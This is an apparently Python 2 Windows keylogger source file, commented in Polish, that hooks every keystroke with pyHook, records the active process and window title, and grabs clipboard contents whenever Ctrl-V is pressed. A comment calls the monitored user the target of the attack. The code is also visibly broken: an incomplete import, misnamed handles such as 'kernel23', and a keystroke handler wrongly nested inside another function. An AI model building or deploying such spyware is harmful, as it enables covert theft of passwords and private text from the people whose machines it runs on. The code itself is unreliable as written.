from ctypes import
import pythoncom
import pyHook
import win32clipboard

user = windll.user32
kernel23 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():

    #uchwyt do pierwszplanowego okna
    hwnd = user32.GetForegroundWindow()

    #sprawdzanie identyfikatora procesu
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    #zapisanie identyfikatora bieżącego procesu
    process_id = "%d" % pid.value

    #pobranie pliku wykonywalnego
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    #odczytywanie tytułu okna
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    #wydruk nagłówka, jeśli jesteśmy w odpowiednim procesie
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value,window_title.value)
    print


    #zamknięcie uchwytów
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

    def KeyStroke(event):

        global current_window

        #sprawdzanie, czy cel ataku zamknął okno
        if event.WindowName != current_window:
            current_window = event.WindowName
            get_current_process()

        #jeśli naciśnięto klawisz standardowy
        if event.Ascii > 32 and event.Ascii < 127:
            print chr(event.Ascii),
        else:
            #Jeśli naciśnięto skrót Ctrl-V, pobieramy wartość ze schowka
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print "[WKLEJ] - %s" % (pasted_value),
            else:
                print "[%s]" % event.Key,

            #przekazywanie wykonywania do następnego zarejestrowania uchwytu
            return True
        
#utworzenie i zarejestrowanie menadżera uchwytów
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke

#zarejstrowanie uchwytu i jego wykonywanie w nieskończoność
kl.HookKeyboard()
pythoncom.PumpMessages()
